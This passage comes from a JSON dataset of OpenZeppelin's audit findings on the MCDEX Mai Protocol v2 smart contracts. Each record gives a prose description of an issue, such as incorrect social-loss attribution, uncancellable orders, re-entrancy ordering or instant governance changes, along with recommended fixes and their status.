      "source_link": "https://blog.openzeppelin.com/mcdex-mai-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11412",
      "title": "[L01] Position size update",
      "impact": "LOW",
      "content": "Whenever the [`UpdatePositionAccount` event](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/Position.sol#L20) is emitted, the `perpetualTotalSize` parameter is set to the size of the `LONG` position, regardless of which side was updated. Although the two sides should eventually balance, the event is often emitted while they are still unbalanced:\n\n\n* when it is emitted [the first time during a trade](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/Position.sol#L252), the second position has not been updated, so the two sides will differ by the trade amount.\n* when it is emitted [the first time during a liquidation](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/Position.sol#L273), the liquidator’s position has not been updated, so the two sides will differ by the liquidation amount.\n* when it is emitted [during settlement](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/Perpetual.sol#L135), the positions are closed in an arbitrary order, so the two sides may have different sizes.\n\n\nConsider emitting the total size of the relevant position, instead of defaulting to the `LONG` size, which is often incorrect.\n\n\n**Update:** *Partially fixed. The [`liquidate` function](https://github.com/mcdexio/mai-protocol-v2/blob/2fcbf4b44f4595e5879ff5efea4e42c529ef0ce1/contracts/perpetual/MarginAccount.sol#L320) no longer emits an `UpdatePositionAccount` event. The remaining events now emit the total size of the relevant position.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "MCDEX Mai Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/mcdex-mai-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11411",
      "title": "[M09] Changes to lotSize and tradingLotSize should be atomic",
      "impact": "MEDIUM",
      "content": "As discussed in issues [M01](#m01) and [M06](#m06), `tradingLotSize` and `lotSize` depend on each other, and [cannot be changed such that `tradingLotSize % lotSize != 0`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/PerpetualGovernance.sol#L61-L69).\n\n\nFor these two dependent parameters, consider creating some function that changes both atomically.\n\n\n**Update:** *Acknowledged.*",
      "summary": "\nThis bug report is about two parameters, `tradingLotSize` and `lotSize`, that depend on each other and cannot be changed such that `tradingLotSize % lotSize != 0`. The suggestion is to create some function that changes both of these parameters atomically. This has been acknowledged by the development team.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "MCDEX Mai Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/mcdex-mai-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11410",
      "title": "[M08] wfrac function returns unintended value in edge case",
      "impact": "MEDIUM",
      "content": "The [`wfrac` function](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/lib/LibMath.sol#L81) in the `LibMathSigned` library is intended to return `x * y / z`. However, in the case of `(x, y, z) = (1, _INT256_MIN, -1)`, the intended result will not be returned. This is because [`_INT256_MIN`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/lib/LibMath.sol#L6) has a higher absolute value than the maximum representable `int256` value, due to the way numbers are encoded in [two’s complement format](https://en.wikipedia.org/wiki/Two%27s_complement).\n\n\nWhen `t` equals `_INT256_MIN` and [`z` is less than `0`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/lib/LibMath.sol#L83), the [negation of `t`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/lib/LibMath.sol#L85) will return the same value as `t`, `_INT256_MIN`.\n\n\nTo avoid this issue, consider replacing the [implicit negation of `t`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/lib/LibMath.sol#L85) with the call `t.neg()`. The [`neg` function](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/lib/LibMath.sol#L13) will revert when called with `_INT256_MIN`. Consider also applying this to the [implicit negation of `z`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/lib/LibMath.sol#L84).\n\n\n**Update:** *Fixed. The recommended changes have been applied.*",
      "summary": "\nA bug was discovered in the `wfrac` function of the `LibMathSigned` library. This function is intended to return `x * y / z` when given `(x, y, z)`, however, when `(x, y, z) = (1, _INT256_MIN, -1)`, the intended result is not returned. This is because the absolute value of `_INT256_MIN` is higher than the maximum representable `int256` value due to the way numbers are encoded in two’s complement format.\n\nTo fix this issue, the implicit negation of `t` and `z` were replaced with the call `t.neg()`. The `neg` function will revert when called with `_INT256_MIN`, thus avoiding the issue. These changes have been applied and the bug has been fixed.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "MCDEX Mai Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/mcdex-mai-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11409",
      "title": "[M07] Undocumented Solidity assembly block",
      "impact": "MEDIUM",
      "content": "The [`hashOrder` function](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/lib/LibOrder.sol#L86) uses assembly to hash an `Order` object. Although implemented correctly, the use of assembly discards several important safety features of Solidity, which may render the code unsafe or more error-prone. It is also harder for readers to parse, for reviewers to verify, and for developers to update.\n\n\nConsider using `abi.encode` to achieve the same functionality. Alternatively, if the efficiency of assembly is required, consider commenting each line, including the magic constants. Additionally, the current pattern accesses unrelated memory locations and introduces low-level assumptions, such as the struct not being allocated below address 32. These should be thoroughly documented.\n\n\n**Update:** *Fixed. The assembly block has been commented.*",
      "summary": "\nThe `hashOrder` function in the mai-protocol-v2 repository uses assembly to hash an `Order` object. This implementation is correct, but it discards several important safety features of Solidity which could make the code unsafe or more error-prone. It is also difficult for readers to parse and for reviewers to verify, and it is hard for developers to update.\n\nAs an alternative, it is suggested to use `abi.encode` to achieve the same functionality. If the efficiency of assembly is required, it is recommended to comment each line, including the magic constants. Furthermore, the current pattern accesses unrelated memory locations and introduces low-level assumptions, such as the struct not being allocated below address 32. These should be thoroughly documented.\n\nThe issue has been fixed and the assembly block has been commented.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "MCDEX Mai Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/mcdex-mai-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11408",
      "title": "[M06] Governance parameter changes should not be instant",
      "impact": "MEDIUM",
      "content": "Many sensitive changes can be made by any account with the [`WhitelistAdmin` role](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/5fe8f4e93bd1d4f5cc9a6899d7f24f5ffe4c14aa/contracts/access/roles/WhitelistAdminRole.sol#L21-L24) via the functions `setGovernanceParameter` within the [`AMMGovernance`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/liquidity/AMMGovernance.sol#L22) and [`PerpetualGovernance`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/PerpetualGovernance.sol#L39) contracts. For example, the `WhitelistAdmin` can change the [fee schedule](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/PerpetualGovernance.sol#L57-L60), the [initial](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/PerpetualGovernance.sol#L40-L44) and [maintenance](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/PerpetualGovernance.sol#L45-L50) margin rates, or the [lot size parameters](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/PerpetualGovernance.sol#L61-L69), and these new parameters instantly take effect in the protocol with important effects.\n\n\nFor example, raising the maintenance margin rate could cause [`isSafe`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/Perpetual.sol#L243) to [return `False`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/Perpetual.sol#L251-L252) when it would have previously returned `True`. This would allow the user’s position [to be liquidated](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/Perpetual.sol#L272). By changing `tradingLotSize`, trades may [revert](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/exchange/Exchange.sol#L63) when being matched, where they would not have before the change. These are only examples; the complexity of the protocol, combined with unpredictable market conditions and user actions means that many other negative effects likely exist as well.\n\n\nSince these changes are occasionally needed, but can create risk for the users of the protocol, consider implementing a time-lock mechanism for such changes to take place. By having a delay between the signal of intent and the actual change, users will have time to remove their funds or close trades that would otherwise be at risk if the change happened instantly. A simple timelock can follow the same pattern as applying for withdrawals ([setting](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/Collateral.sol#L62) an `appliedHeight`, then [checking it when the withdrawal is executed](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/Collateral.sol#L71)). If a timelock is implemented for governance parameter changes, the delay should be on the order of multiple days, to give users time to consider the effects of potential changes and act accordingly.\n\n\n**Update:** *Acknowledged. The Monte Carlo team will implement a delay in the external governance mechanism.*",
      "summary": "\nThis bug report concerns the [`WhitelistAdmin` role](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/5fe8f4e93bd1d4f5cc9a6899d7f24f5ffe4c14aa/contracts/access/roles/WhitelistAdminRole.sol#L21-L24) in the [`AMMGovernance`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/liquidity/AMMGovernance.sol#L22) and [`PerpetualGovernance`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/PerpetualGovernance.sol#L39) contracts. This role is able to make changes to the fee schedule, margin rates, and lot size parameters, which can have a significant impact on the protocol and its users. The bug report suggests that a time-lock mechanism be implemented, so that users have time to respond to any changes before they take effect. This would give users the chance to remove their funds or close trades that may be at risk. The Monte Carlo team has acknowledged the suggestion and will implement a delay in the external governance mechanism.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "MCDEX Mai Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/mcdex-mai-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11407",
      "title": "[M05] Incomplete Denial of Service prevention",
      "impact": "MEDIUM",
      "content": "As described in the [documentation](https://mcdex.io/references/#/en/perpetual?id=broker-amp-withdraw-time-lock), the purpose of the broker and withdraw time locks is to prevent traders nullifying trades that have already been submitted. If this were possible, it would not only disrupt their counterparty’s trade, it may also revert unrelated trades if they are processed in batches. The time locks ensure the order book has time to respond to a trader that attempts to withdraw excess collateral or make trades through the AMM or another broker. However, we have identified two other scenarios that would allow the trader to nullify their trade.\n\n\nFirstly, if the trader [applied to withdraw](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/Perpetual.sol#L123), they could [set their `appliedBalance`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/Collateral.sol#L61) to a large amount. Subsequently, when a trade is processed, `claimDevFee` will ensure [the available margin can cover any opening fee](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/exchange/Exchange.sol#L205-L206). However, the available margin calculation [does not respect the time lock](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/Position.sol#L91), so a large `appliedBalance` can be used immediately to nullify the trade. Consider updating [`availableMarginWithPrice`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/Position.sol#L88) to check the trader’s [`appliedHeight`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/lib/LibTypes.sol#L43) before processing the `appliedBalance`.\n\n\nSecondly, a [trader can directly cancel their order](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/exchange/Exchange.sol#L181). This should immediately prevent it being processed, which would nullify the trade directly. Consider preventing traders from cancelling their request directly, and instead rely on their broker to relay the cancellation.\n\n\n**Note:** This issue is related to [C02](#c02) and any mitigation should consider both issues simultaneously.\n\n\n**Update:** *Fixed with notable change to functionality. The entire timelock mechanism for brokers and withdrawals has been removed. This means there is no protection against a user nullifying a trade that was submitted to the offline order book. Importantly, this does not lead to inconsistencies within the protocol. Additionally, users can no longer choose an arbitrary broker address – they must use an address [approved](https://github.com/mcdexio/mai-protocol-v2/blob/2fcbf4b44f4595e5879ff5efea4e42c529ef0ce1/contracts/global/GlobalConfig.sol#L39) by the administrator (or the AMM).*",
      "summary": "\nMcDex.io is a decentralized exchange platform built on the Ethereum blockchain. The purpose of the broker and withdraw time locks is to prevent traders from nullifying trades that have already been submitted. However, two scenarios were identified that would allow the trader to nullify their trade. Firstly, if the trader applied to withdraw, they could set their appliedBalance to a large amount. This would allow them to nullify the trade as the available margin calculation does not respect the time lock. Secondly, a trader can directly cancel their order which would nullify the trade directly.\n\nTo fix this issue, the timelock mechanism for brokers and withdrawals has been removed. This means there is no protection against a user nullifying a trade that was submitted to the offline order book. Additionally, users can no longer choose an arbitrary broker address – they must use an address approved by the administrator (or the AMM).",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "MCDEX Mai Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/mcdex-mai-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11406",
      "title": "[M04] Missing docstrings and comments",
      "impact": "MEDIUM",
      "content": "Most of the contracts and functions in the audited code base lack documentation. This hinders reviewers’ understanding of the code’s intention, which is fundamental to correctly assess not only security, but also correctness. Additionally, docstrings improve readability and ease maintenance. They should explicitly explain the purpose or intention of the functions, the scenarios under which they can fail, the roles allowed to call them, the values returned and the events emitted.\n\n\nConsider thoroughly documenting all functions (and their parameters) that are part of the contracts’ public API. Functions implementing sensitive functionality, even if not public, should be clearly documented as well. When writing docstrings, consider following the [Ethereum Natural Specification Format](https://solidity.readthedocs.io/en/develop/natspec-format.html) (NatSpec).\n\n\nAdditionally, the OpenZeppelin team found a notable lack of comments throughout the audited code. Well-commented code not only improves audit speed and depth, but it also helps to reveal what developer intentions may be and thus helps identify issues of misalignment between intention and implementation. Without comments, identifying issues in the code is much more difficult. Aside from benefiting auditors, code comments also benefit future developers and users, by clearly defining the functionality of the code and by reducing the risk of bugs.\n\n\nConsider thoroughly commenting the existing code, and adding regular commenting to the software development process. We specifically recommend commenting every line of assembly code and commenting all complex math operations.\n\n\n**Update:** *Fixed. Many parts of the codebase have been documented and commented.*",
      "summary": "\nThis bug report is about the lack of documentation and comments in the audited code base. This lack of documentation and comments makes it difficult for reviewers to understand the code's intention and hinders their ability to assess the security and correctness of the code. To solve this issue, the OpenZeppelin team recommends thoroughly documenting all functions (and their parameters) that are part of the contracts' public API, as well as functions implementing sensitive functionality, even if not public. Additionally, they recommend thoroughly commenting the existing code, and adding regular commenting to the software development process. This should include commenting every line of assembly code and commenting all complex math operations. The bug report has since been fixed, with many parts of the codebase now documented and commented.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "MCDEX Mai Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/mcdex-mai-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11405",
      "title": "[M03] Re-entrancy possibilities",
      "impact": "MEDIUM",
      "content": "[Solidity recommends the usage of the Check-Effects-Interaction Pattern](https://solidity.readthedocs.io/en/latest/security-considerations.html#use-the-checks-effects-interactions-pattern) to avoid potential security issues, such as reentrancy. However, there are several examples of interactions preceding effects:\n\n\n* In the `deposit` function of the `Collateral` contract, [collateral is retrieved](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/Collateral.sol#L51) before [the user balance is updated and an event is emitted](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/Collateral.sol#L54-L56).\n* In the `_withdraw` function of the `Collateral` contract, [collateral is sent](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/Collateral.sol#L81-L85) before the [event is emitted](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/Collateral.sol#L86)\n* The same pattern occurs in the [`depositToInsuranceFund`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/Perpetual.sol#L180), [`depositEtherToInsuranceFund`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/Perpetual.sol#L192) and [`withdrawFromInsuranceFund`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/Perpetual.sol#L204) functions of the `Perpetual` contract.\n\n\nIt should be noted that even when a correctly implemented ERC20 contract is used for collateral, incoming and outgoing transfers could execute arbitrary code if the contract is also ERC777 compliant. These re-entrancy opportunities are unlikely to corrupt the internal state of the system, but they would effect the order and contents of emitted events, which could confuse external clients about the state of the system. Consider always following the “Check-Effects-Interactions” pattern.\n\n\n**Update:** *Fixed. The [`ReentrancyGuard`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v2.5.0/contracts/utils/ReentrancyGuard.sol) contract is now used to protect those functions.*",
      "summary": "\nThis bug report is about the potential security issues caused by not following the Check-Effects-Interactions Pattern in Solidity. This pattern is recommended by Solidity to avoid reentrancy, which could lead to potential security issues. Examples of interactions preceding effects were found in the `deposit`, `_withdraw`, `depositToInsuranceFund`, `depositEtherToInsuranceFund`, and `withdrawFromInsuranceFund` functions of the `Collateral` and `Perpetual` contracts. Even when a correctly implemented ERC20 contract is used for collateral, incoming and outgoing transfers could execute arbitrary code if the contract is also ERC777 compliant, which could confuse external clients about the state of the system.\n\nTo fix this bug, the ReentrancyGuard contract was used to protect the functions mentioned above. This contract prevents reentrancy by using a mutex lock and ensuring that any function calls are completed before the lock is released. This ensures that the order and contents of emitted events is not affected and external clients can accurately determine the state of the system.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "MCDEX Mai Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/mcdex-mai-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11404",
      "title": "[M02] Unspecified parameters",
      "impact": "MEDIUM",
      "content": "When a user liquidates another position, they [specify the maximum position amount to liquidate](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/Perpetual.sol#L291). However, the [liquidation price](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/Perpetual.sol#L274) and [position side](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/Position.sol#L267) is inferred contextually from the current mark price and the state of the target account. These values could change before the liquidation is confirmed, particularly during periods of high Ethereum congestion. In many cases the liquidator would accept any successful liquidation, but for the sake of predictability, consider allowing the liquidator to specify an acceptable price range, the side of the positions to liquidate and a deadline for when the liquidation attempt expires.\n\n\nSimilarly, when [creating the AMM pool](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/liquidity/AMM.sol#L162), [adding liquidity](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/liquidity/AMM.sol#L267) or [removing liquidity](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/liquidity/AMM.sol#L288), the price is inferred contextually. In the case of adding or removing liquidity, it could even change based on the actions of other users in the same block. Consider allowing the user to specify an acceptable price range and a deadline for when the action expires.\n\n\n**Update:** *Acknowledged. The Monte Carlo team have decided not to address this issue.*",
      "summary": "\nThis bug report is about the maximum position amount to liquidate when a user liquidates another position and the liquidation price and position side that is inferred contextually from the current mark price and the state of the target account. It also discusses the price that is inferred contextually when creating an AMM pool, adding liquidity, or removing liquidity. The bug report suggests that the user should be allowed to specify an acceptable price range and a deadline for when the action expires. This would make the liquidation and other actions more predictable. However, the Monte Carlo team have decided not to address this issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "MCDEX Mai Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/mcdex-mai-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11403",
      "title": "[M01] liquidateFrom does not use tradingLotSize",
      "impact": "MEDIUM",
      "content": "In the `Perpetual` contract, within the function `liquidateFrom` there is a check that the [`maxAmount` to be liquidated is a multiple of `lotSize`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/Perpetual.sol#L271). This [may be the amount](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/Perpetual.sol#L279) of some user’s position that gets liquidated by the end of the function call.\n\n\nHowever, all trades which happen during a call to `matchOrders` [must be for an amount that is a multiple of `tradingLotSize`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/exchange/Exchange.sol#L63). This is the only way to trade with other users. Otherwise, trading with the AMM is also limited through checks [in `buyFrom`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/liquidity/AMM.sol#L183) and [`sellFrom`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/liquidity/AMM.sol#L225) such that the user can only trade amounts that are a multiple of `tradingLotSize`.\n\n\nIn the `PerpetualGovernance` contract, we can see that [`tradingLotSize` must be a multiple of `lotSize`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/PerpetualGovernance.sol#L61-L69). If these two numbers differ, and a user is liquidated for an amount not divisible by `tradingLotSize`, they may have a left-over position that is not an even multiple of `tradingLotSize`. If this occurs, they may not be able to close their position completely.\n\n\nConsider restricting liquidation amounts to multiples of `tradingLotSize`, rather than `lotSize`. Alternatively, consider providing a method for liquidated traders to close their positions that are of less than `tradingLotSize`.\n\n\n**Update:** *Acknowledged. Typically, `lotSize` and `tradingLotSize` will be the same value, but `tradingLotSize` might be increased to help with high Ethereum congestion.*",
      "summary": "\nThis bug report concerns the Perpetual contract within the Mai Protocol v2. It explains that when a user is liquidated, the amount must be a multiple of the lotSize. However, when a user trades with other users, the amount must be a multiple of the tradingLotSize. If these two values are different, and a user is liquidated for an amount not divisible by tradingLotSize, they may have a left-over position that is not an even multiple of tradingLotSize, making it impossible for the user to close their position completely.\n\nThe report suggests that either liquidation amounts should be restricted to multiples of tradingLotSize, or a method should be provided for liquidated traders to close their positions that are of less than tradingLotSize. An update to the report acknowledges that lotSize and tradingLotSize are typically the same value, but tradingLotSize might be increased to help with high Ethereum congestion.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "MCDEX Mai Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/mcdex-mai-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11402",
      "title": "[H01] Incorrect social loss",
      "impact": "HIGH",
      "content": "When a bankrupt position is liquidated and the insurance fund is empty, the [opponent position holders should cover the loss](https://mcdex.io/references/#/en/perpetual?id=auto-liquidation). In this way, the profits on one side are garnished to fund the loss on the other side. This ensures the system as a whole cannot become insolvent. However, the loss is [actually attributed to positions on the same side](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/Position.sol#L290). In the worst case, none of the positions on the same side will be able to cover the loss, which means the contract will be underfunded and some profits will not be redeemable. Consider updating the code to assign losses to the opposite side of the liquidation.\n\n\n**Update:** *Fixed.*",
      "summary": "\nThis bug report is about a bug in the code of the Mcdex.io platform. The bug occurs when a bankrupt position is liquidated and the insurance fund is empty. In this case, the losses are attributed to positions on the same side, which can lead to the contract being underfunded. This means that some profits will not be redeemable. To fix this issue, the code should be updated to assign losses to the opposite side of the liquidation. The bug has now been fixed.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "MCDEX Mai Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/mcdex-mai-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11401",
      "title": "[C02] Orders cannot be cancelled",
      "impact": "HIGH",
      "content": "When a user or broker calls [`cancelOrder`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/exchange/Exchange.sol#L180), [the `cancelled` mapping](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/exchange/Exchange.sol#L184) is updated, but this has no subsequent effects. In particular, [`validateOrderParam`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/exchange/Exchange.sol#L155) does not check if the order has been cancelled.\n\n\nConsider adding this check to the order validation to ensure cancelled orders cannot be filled.\n\n\n**Update:** *Fixed. The validation now checks the cancellation status.*",
      "summary": "\nThis bug report is about the [`cancelOrder`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/exchange/Exchange.sol#L180) function on the [`mcdexio`](https://github.com/mcdexio/mai-protocol-v2) platform. When this function is called, the [`cancelled` mapping](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/exchange/Exchange.sol#L184) is updated, but this had no subsequent effects. The [`validateOrderParam`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/exchange/Exchange.sol#L155) function did not check if the order had been cancelled, which could lead to cancelled orders being filled.\n\nThe bug has now been fixed. The validation now checks the cancellation status to ensure cancelled orders cannot be filled.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "MCDEX Mai Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/mcdex-mai-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11400",
      "title": "[C01] Anyone can liquidate on behalf of another account",
      "impact": "HIGH",
